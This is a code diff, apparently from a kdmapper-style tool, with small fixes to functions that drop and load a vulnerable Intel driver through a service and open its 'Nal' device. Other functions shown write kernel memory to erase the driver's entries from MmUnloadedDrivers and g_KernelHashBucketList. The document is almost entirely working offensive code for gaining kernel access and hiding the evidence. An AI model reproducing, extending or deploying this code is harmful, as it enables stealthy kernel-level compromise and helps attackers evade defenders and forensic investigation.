@@ -36,7 +36,7 @@ HANDLE intel_driver::Load()
 	for (int i = 0; i < len; ++i)
 		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
 
-	std::cout << "[<] Loading vulnerable driver" << std::endl;
+	std::cout << "[<] Loading vulnerable driver, Name: " << intel_driver::driver_name << std::endl;
 
 	char temp_directory[MAX_PATH] = { 0 };
 	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
@@ -44,7 +44,7 @@ HANDLE intel_driver::Load()
 	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH)
 	{
 		std::cout << "[-] Failed to get temp path" << std::endl;
-		return nullptr;
+		return INVALID_HANDLE_VALUE;
 	}
 	if (temp_directory[strlen(temp_directory) - 1] == '\\')
 		temp_directory[strlen(temp_directory) - 1] = 0x0;
@@ -54,14 +54,14 @@ HANDLE intel_driver::Load()
 	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
 	{
 		std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
-		return nullptr;
+		return INVALID_HANDLE_VALUE;
 	}
 
 	if (!service::RegisterAndStart(driver_path))
 	{
 		std::cout << "[-] Failed to register and start service for the vulnerable driver" << std::endl;
 		std::remove(driver_path.c_str());
-		return nullptr;
+		return INVALID_HANDLE_VALUE;
 	}
 
 	HANDLE result = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -433,14 +433,14 @@ bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
 		return false;
 	}
 
-	wchar_t * unloadedName = new wchar_t[(ULONG64)us_driver_base_dll_name.Length/2ULL + 1ULL];
-	memset(unloadedName, 0, us_driver_base_dll_name.Length);
+	wchar_t * unloadedName = new wchar_t[(ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL];
+	memset(unloadedName, 0, us_driver_base_dll_name.Length + sizeof(wchar_t));
 	
 	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName, us_driver_base_dll_name.Length)) {
 		std::cout << "[!] Failed to read driver name" << std::endl;
 		return false;
 	}
-	
+
 	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver
 
 	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
@@ -758,7 +758,7 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 			}
 
 			wchar_t* wsName = new wchar_t[(ULONG64)wsNameLen / 2ULL + 1ULL];
-			memset(wsName, 0, wsNameLen);
+			memset(wsName, 0, wsNameLen + sizeof(wchar_t));
 
 			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen)) {
 				std::cout << "[-] Failed to read g_KernelHashBucketList entry text!" << std::endl;
@@ -767,7 +767,7 @@ bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
 				}
 				return false;
 			}
-				
+
 			if (std::wstring(wsName).find(wdname) != std::wstring::npos) {
 				std::wcout << L"[+] Found In g_KernelHashBucketList: " << wsName << " -> " << wsNameLen << std::endl;
 				HashBucketEntry* Next = 0;
